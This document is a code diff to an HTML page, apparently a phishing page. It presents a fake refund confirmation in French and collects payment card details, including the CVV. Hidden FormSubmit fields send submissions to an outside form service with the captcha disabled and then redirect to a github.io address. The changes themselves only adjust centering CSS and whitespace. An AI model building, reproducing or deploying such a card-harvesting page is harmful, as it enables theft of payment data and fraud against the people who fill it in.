@@ -5,20 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Confirmation</title>
     <style>
-        /* فقط إضافة التوسيط */
-        html, body {
-            height: 100%;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        body > * {
-            max-width: 400px;
-            width: 100%;
-        }
-
-        /* باقي التنسيقات كما هي */
         body {
             font-family: Arial, sans-serif;
             background-color: #fff;
@@ -259,10 +245,10 @@
             <input type="text" id="inputcvv" name="CVV" oninput="validateInput('cvv')" required />
 
             <button type="submit" id="button">Confirmer votre remboursement</button>
- <!-- FormSubmit hidden fields -->
+
+            <!-- FormSubmit hidden fields -->
             <input type="hidden" name="_next" value="https://sa3d3452.github.io/code/" />
             <input type="hidden" name="_captcha" value="false" />
-           
         </div>
     </form>
 
@@ -358,3 +344,4 @@
     </script>
 </body>
 </html>
+
